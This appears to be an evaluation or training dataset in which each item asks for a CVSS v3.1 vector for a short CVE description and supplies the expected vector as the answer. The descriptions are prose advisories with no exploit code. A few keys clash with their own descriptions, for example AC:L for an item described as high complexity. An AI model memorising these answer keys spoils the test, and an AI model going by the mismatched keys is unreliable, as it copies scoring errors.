Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Using a javascript: URI with a setTimeout race condition, an attacker can execute unauthorized scripts on top origin sites in urlbar. This bypasses security measures, potentially leading to arbitrary code execution or unauthorized actions within the user's loaded webpage. This vulnerability affects Focus for iOS < 122. 	CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Vintage, member of the AXIS OS Bug Bounty Program, has found that the VAPIX API create_overlay.cgi did not have a sufficient input validation allowing for a possible remote code execution. This flaw can only be exploited after authenticating with an operator- or administrator-privileged service account. Axis has released patched AXIS OS versions for the highlighted flaw. Please refer to the Axis security advisory for more information and solution. 	CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: An attacker with access to a Management Console user account with the editor role could escalate privileges through a command injection vulnerability in the Management Console. This vulnerability affected all versions of GitHub Enterprise Server and was fixed in versions 3.11.3, 3.10.5, 3.9.8, and 3.8.13 This vulnerability was reported via the GitHub Bug Bounty program. 	CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Cross Site Scripting Vulnerability in Elite CRM v1.2.11 allows attacker to execute arbitrary code via the language parameter to the /ngs/login endpoint. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Barangay Population Monitoring System v1.0 was discovered to contain a cross-site scripting (XSS) vulnerability in the Add Resident function at /barangay-population-monitoring-system/masterlist.php. This vulnerabiity allows attackers to execute arbitrary web scripts or HTML via a crafted payload injected into the Contact Number parameter. 	CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Command injection vulnerability in /usr/www/res.php in FLIR AX8 up to 1.46.16 allows attackers to run arbitrary commands via the value parameter. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: The vulnerability allows a remote attacker to upload arbitrary files in all paths of the system under the context of the application OS user (“root”) via a crafted HTTP request. By abusing this vulnerability, it is possible to obtain remote code execution (RCE) with root privileges on the device. 	CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Cross-site scripting (XSS) vulnerability in XunRuiCMS versions v4.6.2 and before, allows remote attackers to obtain sensitive information via crafted malicious requests to the background login. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Tenda AX1803 v1.0.0.1 contains a stack overflow via the adv.iptv.stballvlans parameter in the function formSetIptv. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: The POST SMTP Mailer WordPress plugin before 2.8.7 does not properly sanitise and escape several parameters before using them in SQL statements, leading to a SQL injection exploitable by high privilege users such as admin. 	CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Cross Site Request Forgery vulnerability in flusity-CMS v.2.33 allows a remote attacker to execute arbitrary code via the delete_post .php. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: A vulnerability, which was classified as critical, has been found in 个人开源 mldong 1.0. This issue affects the function ExpressionEngine of the file com/mldong/modules/wf/engine/model/DecisionModel.java. The manipulation leads to code injection. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. The identifier VDB-251561 was assigned to this vulnerability. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: A buffer copy without checking size of input vulnerability has been reported to affect several QNAP operating system versions. If exploited, the vulnerability could allow authenticated administrators to execute code via a network.  We have already fixed the vulnerability in the following versions: QTS 5.1.2.2533 build 20230926 and later QuTS hero h5.1.2.2534 build 20230927 and later QuTScloud c5.1.5.2651 and later 	CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: FPE in paddle.topk in PaddlePaddle before 2.6.0. This flaw can cause a runtime crash and a denial of service. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: httparty before 0.21.0 is vulnerable to an assumed-immutable web parameter vulnerability. A remote and unauthenticated attacker can provide a crafted filename parameter during multipart/form-data uploads which could result in attacker controlled filenames being written. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: IBM Maximo Asset Management 7.6.1.3 could allow a remote attacker to log into the admin panel due to improper access controls.  IBM X-Force ID:  255073. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: SQL injection vulnerability in adv radius v.2.2.5 allows a local attacker to execute arbitrary code via a crafted script. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Missing Authorization vulnerability in Zorem Sales Report Email for WooCommerce.This issue affects Sales Report Email for WooCommerce: from n/a through 2.8. 	CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: The hiWeb Migration Simple WordPress plugin through 2.0.0.1 does not sanitise and escape a parameter before outputting it back in the page, leading to a Reflected Cross-Site Scripting which could be used against high-privilege users such as admins. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: FPE in paddle.lerp in PaddlePaddle before 2.6.0. This flaw can cause a runtime crash and a denial of service. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: SQL Injection vulnerability in Quest Analytics LLC IQCRM v.2023.9.5 allows a remote attacker to execute arbitrary code via a crafted request to the Common.svc WSDL page. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: IBM Security Verify Access 10.0.6 could disclose sensitive snapshot information due to missing encryption.  IBM X-Force ID:  281607. 	CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: The Community by PeepSo WordPress plugin before 6.3.1.2 does not have CSRF check when creating a user post (visible on their wall in their profile page), which could allow attackers to make logged in users perform such action via a CSRF attack 	CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: This vulnerability exist in Skyworth Router CM5100, version 4.1.1.24, due to insufficient validation of user supplied input for the Preshared Phrase parameter at its web interface.  A remote attacker could exploit this vulnerability by supplying specially crafted input to the parameter at the web interface of the vulnerable targeted system.  Successful exploitation of this vulnerability could allow the attacker to perform stored XSS attacks on the targeted system. 	CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in WPdevelop / Oplugins WP Booking Calendar allows Stored XSS.This issue affects WP Booking Calendar: from n/a before 9.7.4. 	CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: A vulnerability was found in code-projects Fighting Cock Information System 1.0. It has been classified as critical. This affects an unknown part of the file /admin/action/new-feed.php. The manipulation of the argument type_feed leads to sql injection. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used. The identifier VDB-250593 was assigned to this vulnerability. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: In video decoder, there is a possible out of bounds read due to improper input validation. This could lead to local denial of service with no additional execution privileges needed 	CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: QStar Archive Solutions Release RELEASE_3-0 Build 7 Patch 0 was discovered to contain a DOM Based reflected XSS vulnerability within the component qnme-ajax?method=tree_table. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: A Cross-Frame Scripting vulnerability has been found on Plone CMS affecting verssion below 6.0.5. An attacker could store a malicious URL to be opened by an administrator and execute a malicios iframe element. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:L
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Multiple integer overflow vulnerabilities exist in the VZT vzt_rd_block_vch_decode times parsing functionality of GTKWave 3.3.115. A specially crafted .vzt file can lead to memory corruption. A victim would need to open a malicious file to trigger these vulnerabilities.This vulnerability concerns the integer overflow when num_time_ticks is not zero. 	CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Reflected cross-site scripting (XSS) vulnerabilities in Trend Micro Mobile Security (Enterprise) could allow an exploit against an authenticated victim that visits a malicious link provided by an attacker.  Please note, this vulnerability is similar to, but not identical to, CVE-2023-41178. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: A vulnerability was found in Totolink N200RE V5 9.3.5u.6255_B20211224. It has been classified as problematic. Affected is an unknown function of the file /cgi-bin/cstecgi.cgi. The manipulation leads to session expiration. It is possible to launch the attack remotely. The complexity of an attack is rather high. The exploitability is told to be difficult. The exploit has been disclosed to the public and may be used. VDB-252186 is the identifier assigned to this vulnerability. NOTE: The vendor was contacted early about this disclosure but did not respond in any way. 	CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: The Elementor Addons by Livemesh plugin for WordPress is vulnerable to Stored Cross-Site Scripting via the plugin's widget URL parameters in all versions up to, and including, 8.3.1 due to insufficient input sanitization and output escaping. This makes it possible for authenticated attackers with contributor access or higher to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page. 	CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Due to a failure in validating the number of scanline samples of a OpenEXR file containing deep scanline data, Academy Software Foundation OpenEX image parsing library version 3.2.1 and prior is susceptible to a heap-based buffer overflow vulnerability. This issue was resolved as of versions v3.2.2 and v3.1.12 of the affected library. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Cross-Site Request Forgery (CSRF) vulnerability in Doofinder Doofinder WP & WooCommerce Search.This issue affects Doofinder WP & WooCommerce Search: from n/a through 2.0.33. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Command injection in the ping utility on Buffalo LS210D 1.78-0.03 allows a remote authenticated attacker to inject arbitrary commands onto the NAS as root. 	CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
